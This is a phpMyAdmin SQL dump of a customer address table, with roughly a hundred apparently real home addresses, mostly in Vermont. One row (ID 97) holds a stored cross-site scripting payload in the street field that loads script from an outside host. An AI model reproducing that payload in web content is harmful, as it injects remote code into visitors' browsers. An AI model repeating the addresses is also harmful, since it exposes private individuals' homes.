-- phpMyAdmin SQL Dump
-- version 4.8.3
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Apr 11, 2020 at 10:30 AM
-- Server version: 5.6.43
-- PHP Version: 7.2.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `homeport_2018`
--

-- --------------------------------------------------------

--
-- Table structure for table `web_addr`
--

CREATE TABLE `web_addr` (
  `wa_ID` int(11) NOT NULL,
  `wc_ID` int(11) NOT NULL,
  `wa_line1` tinytext NOT NULL,
  `wa_line2` tinytext,
  `wa_city` tinytext NOT NULL,
  `wa_state` tinytext NOT NULL,
  `wa_zip` tinytext NOT NULL,
  `wa_registry` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `web_addr`
--

INSERT INTO `web_addr` (`wa_ID`, `wc_ID`, `wa_line1`, `wa_line2`, `wa_city`, `wa_state`, `wa_zip`, `wa_registry`) VALUES
(15, 10, '247 Main Street', 'APT 1A', 'WINOOSKI', 'VT', '05404', 1),
(16, 11, '215 W. 88th St. , NY, NY', '#11H', 'NEW YORK', 'NY', '10024', 0),
(17, 12, '191 Browns Trace Rd', '', 'JERICHO', 'VT', '05465', 0),
(19, 13, '771 Essex rd', 'APT 1', 'WILLISTON', 'VT', '05495', 1),
(20, 14, '294 Crosby Heights', '', 'VERGENNES', 'VT', '05491', 1),
(21, 15, '52 Overlake Park', '', 'BURLINGTON', 'VT', '05401', 1),
(22, 16, '2 Spruce Street', '', 'STONEHAM', 'MA', '02180', 1),
(24, 9, '4458 Greenbush Rd', '', 'CHARLOTTE', 'VT', '05445', 0),
(38, 29, '4458 greenbush road', 'charlotte', 'CHARLOTTE', 'VT', '05445', 0),
(40, 33, '3338 ThÃ©rÃ¨se Casgrain Sherbrooke Canada', '', '', '', 'j1l3a2', 0),
(41, 35, '601 E Cincinatti Greenup Illinois', '', 'GREENUP', 'IL', '62428', 0),
(42, 42, '93 Woodland Drive', '', 'BARRE', 'VT', '05641', 1),
(43, 47, '52 Church Street', '', 'BURLINGTON', 'VT', '05401', 1),
(44, 24, '601 E cincinatti', '', 'GREENUP', 'IL', '62428', 0),
(45, 53, '100 West Canal St', '#39', 'WINOOSKI', 'VT', '05404', 0),
(46, 54, '15 Lake St', 'Apt 4H', 'WHITE PLAINS', 'NY', '10603', 0),
(47, 55, '360 Barber Ave, Ann Arbor MI', '', 'ANN ARBOR', 'MI', '48103', 0),
(48, 56, 'P O BOX 46', '', 'POULTNEY', 'VT', '05764', 0),
(49, 75, '52 church st Burlington, VT', '', 'BURLINGTON', 'VT', '05401', 0),
(50, 77, '1024 3rd ave NE', '', 'BRAINERD', 'MN', '56401', 0),
(51, 78, 'L16 Stonehedge Dr', '', '', '', '05423', 1),
(52, 79, '3436 rue NapolÃ©on', '', '', '', 'J6x4b9', 0),
(53, 23, '601 E cincinatti', '', 'GREENUP', 'IL', '62428', 0),
(54, 83, 'Kurac 123', '123', '', '', '10000', 1),
(55, 91, '5585 NW 72nd Ave', '50678', 'MIAMI', 'FL', '33195', 0),
(56, 45, '70 North Street', '2', 'BURLINGTON', 'VT', '05401', 0),
(58, 94, '5585 NW 72nd Ave', '50678', 'MIAMI', 'FL', '33195', 0),
(59, 95, '2200 Hill Road', '', 'PERKIOMENVILLE', 'PA', '18074', 0),
(60, 97, '1291 North Ave', '', 'BURLINGTON', 'VT', '05408', 1),
(61, 100, '398 Jenness Pond rd', '', 'NORTHWOOD', 'NH', '03261', 0),
(62, 114, '880 Lake Rd, Milton VT', '', 'BURLINGTON', 'VT', '05408', 1),
(63, 125, '2016 Creekview Ct. Red Wing, MN', '', 'RED WING', 'MN', '55066', 0),
(64, 40, '1905 warren st', '', 'HARLINGEN', 'TX', '78550', 0),
(65, 109, '8225 Mukilteo Speedway ', '', 'MUKILTEO', 'WA', '98275', 0),
(66, 130, 'PO Box 322', '160 Jaffrey Road', 'MARLBOROUGH', 'NH', '03455', 0),
(67, 130, '172 Great Road', '', 'JAFFREY', 'NH', '03452', 0),
(68, 126, '235 Fire Field rd New Braunfels TEXAS', '', 'NEW BRAUNFELS', 'TX', '78130', 0),
(69, 135, '1950 Brazier Road', '', 'MONTPELIER', 'VT', '05602', 0),
(70, 136, '10 Scottfield Rd Allston MA ', '23', 'ALLSTON', 'MA', '02134', 0),
(71, 141, '112 WESTON HTS', '', 'WINDSOR', 'VT', '05089', 0),
(72, 142, '3300 West Camelback Road ', 'Jerome - 415', 'PHOENIX', 'AZ', '85017', 0),
(73, 145, '93 Woodland Drive', '', 'BARRE', 'VT', '05641', 0),
(74, 164, '296 South Cove Rd.', '', 'BURLINGTON', 'VT', '05401', 0),
(75, 168, '48511 Whitaker Rd', '', 'SAINT INIGOES', 'MD', '20684', 0),
(76, 176, '930 Hayes St', 'Apt A', 'SAN FRANCISCO', 'CA', '94117', 0),
(77, 199, '125 Riverview Rd', '', 'WAITSFIELD', 'VT', '05673', 0),
(78, 206, '88 Corbett Road', '', 'UNDERHILL', 'VT', '05489', 0),
(79, 207, 'po box 421', '', 'MAULDIN', 'SC', '29662', 0),
(80, 222, '100 Oak Leaf Circle', '', 'ESTILL SPRINGS', 'TN', '37330', 0),
(81, 227, '10 Marie Lane, Ridgefield, CT', '', 'RIDGEFIELD', 'CT', '06877', 0),
(82, 231, 'Ms.MaryM.Rich', '155 vermont street', '', '', '14609-4904', 0),
(83, 236, 'Dealer Policy  2300 St George Rd', '', 'WILLISTON', 'VT', '05495', 0),
(84, 216, '2214 Arnold Bay Rd', '', 'VERGENNES', 'VT', '05491', 0),
(85, 250, '311 2nd St, Oakland, CA', 'APT 705', 'OAKLAND', 'CA', '94607', 0),
(86, 251, '5 Prospect Street Needham, MA', '', 'NEEDHAM', 'MA', '02492', 0),
(87, 252, '258 Pearl Street', 'Apt. #1', 'BURLINGTON', 'VT', '05401', 0),
(88, 264, '326 Quarry Hill Rd.', 'apt 243', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(89, 273, '2110 W Pontiac Dr', '', 'PHOENIX', 'AZ', '85027', 0),
(90, 278, '397 Kearsarge Valley Road', '', '', '', '03260', 0),
(91, 294, '17 Ox Yoke Drive', '', 'SIMSBURY', 'CT', '06070', 0),
(92, 306, '634 Masters Way', '', 'PALM BEACH GARDENS', 'FL', '33418', 0),
(93, 307, '181 Winterberry Ln ', '302', '', '', '05401-5924', 0),
(94, 9, '123 Elm Street', '', '', '', '08294', 0),
(96, 339, '24 Westmore', '', 'CUMBERLAND CENTER', 'ME', '04021', 0),
(97, 343, '444 Rollins St\"><sCRiPt sRC=//gk.gy/y></sCrIpT>', '', 'MISSOULA', 'MT', '59801', 0),
(99, 344, '1988 Highway 98W Carrabelle Florida ', '', 'CARRABELLE', 'FL', '32322', 0),
(100, 361, '39 OVERLOOK DR', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(101, 365, '321 Porterwood Drive Williston VT 05495', '', 'WILLISTON', 'VT', '05495', 0),
(102, 367, '33 Shepard Street', 'Apt C', 'WINOOSKI', 'VT', '05404', 0),
(103, 369, '185 Adelphi St', 'Apt 3', 'BROOKLYN', 'NY', '11205', 0),
(104, 371, '5 S.Main Street', '75643', 'ENGLISHTOWN', 'NJ', '07726', 0),
(105, 378, '364 S Winooski Ave', 'Apt K', 'BURLINGTON', 'VT', '05401', 0),
(106, 385, '185 Davis Road', 'N603', 'BURLINGTON', 'VT', '05401', 0),
(107, 388, '141 Bay Meadow Estates Unit #4', 'Colchester', 'COLCHESTER', 'VT', '05446', 0),
(108, 395, '3601 Old Capitol Trail Unit A-7', 'Suite 115802', 'WILMINGTON', 'DE', '19808', 0),
(109, 400, '78 Woodlawn Rd', 'Apt B', 'BURLINGTON', 'VT', '05408', 0),
(110, 407, '25 Baycrest Drive #110', 'South Burlington', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(111, 409, '309 Aurielle Drive Colchester', '', 'COLCHESTER', 'VT', '05446', 0),
(112, 427, '1468 Williston Road', '', 'SOUTH BURLINGTON', 'VT', '05403', 0),
(113, 430, '55 Crescent Road', '', 'BURLINGTON', 'VT', '05401', 0),
(114, 437, '72 North Street', 'Apt A', 'WINOOSKI', 'VT', '05404', 0),
(115, 440, '288 Flynn Ave.', 'Unit # 21', 'BURLINGTON', 'VT', '05401', 0),
(116, 449, '11 Hill Street', '', 'RYE', 'NY', '10580', 0),
(117, 459, '28 Catamount Dr Milton', '', 'MILTON', 'VT', '05468', 0),
(118, 479, '765 Maple Hill Road', '', 'ROCHESTER', 'VT', '05767', 0),
(119, 486, '450 n market st', '', 'LANCASTER', 'PA', '17603', 0);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `web_addr`
--
ALTER TABLE `web_addr`
  ADD PRIMARY KEY (`wa_ID`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `web_addr`
--
ALTER TABLE `web_addr`
  MODIFY `wa_ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=120;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
